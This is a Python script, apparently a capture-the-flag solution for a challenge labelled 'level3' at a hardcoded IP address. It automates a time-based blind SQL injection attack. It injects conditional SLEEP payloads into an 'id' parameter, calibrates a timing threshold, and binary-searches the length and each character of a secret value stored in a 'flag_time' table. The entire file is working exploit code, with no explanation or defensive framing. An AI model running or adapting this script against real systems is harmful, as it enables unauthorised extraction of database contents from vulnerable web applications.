import time
import requests

BASE_URL = "http://167.172.204.79:5107/level3"
SLEEP_SECS = 2.0
THRESHOLD = 1.2
MAX_LEN = 128
ASCII_LOW = 32
ASCII_HIGH = 126


def timed_query(injected_id: str) -> float:
    start = time.perf_counter()
    requests.get(BASE_URL, params={"id": injected_id}, timeout=10)
    return time.perf_counter() - start


def is_true(condition_sql: str) -> bool:
    payload = f"1 OR (SELECT CASE WHEN ({condition_sql}) THEN SLEEP({SLEEP_SECS}) ELSE 0 END)"
    elapsed = timed_query(payload)
    return elapsed > THRESHOLD


def calibrate():
    false_payload = "1 OR (SELECT CASE WHEN (1=0) THEN SLEEP(2) ELSE 0 END)"
    true_payload = "1 OR (SELECT CASE WHEN (1=1) THEN SLEEP(2) ELSE 0 END)"

    false_times = [timed_query(false_payload) for _ in range(3)]
    true_times = [timed_query(true_payload) for _ in range(3)]

    avg_false = sum(false_times) / len(false_times)
    avg_true = sum(true_times) / len(true_times)

    print(f"[calibrate] false avg: {avg_false:.3f}s")
    print(f"[calibrate] true  avg: {avg_true:.3f}s")
    print(f"[calibrate] threshold currently set to: {THRESHOLD:.3f}s")
    print("If needed, set THRESHOLD roughly halfway between false and true averages.\n")


def get_flag_length() -> int:
    lo, hi = 1, MAX_LEN
    while lo < hi:
        mid = (lo + hi) // 2
        cond = f"(SELECT length(value) FROM flag_time LIMIT 1) >= {mid}"
        if is_true(cond):
            lo = mid + 1
        else:
            hi = mid
    return lo - 1


def get_char_at(pos: int) -> str:
    lo, hi = ASCII_LOW, ASCII_HIGH
    while lo <= hi:
        mid = (lo + hi) // 2
        cond = f"unicode(substr((SELECT value FROM flag_time LIMIT 1),{pos},1)) > {mid}"
        if is_true(cond):
            lo = mid + 1
        else:
            hi = mid - 1
    return chr(lo)


def extract_flag() -> str:
    length = get_flag_length()
    print(f"[+] Detected length: {length}")

    out = []
    for i in range(1, length + 1):
        ch = get_char_at(i)
        out.append(ch)
        print(f"[+] pos {i:02d}: {ch}   current: {''.join(out)}")
    return "".join(out)


if __name__ == "__main__":
    calibrate()
    flag = extract_flag()
    print(f"\n[FLAG] {flag}")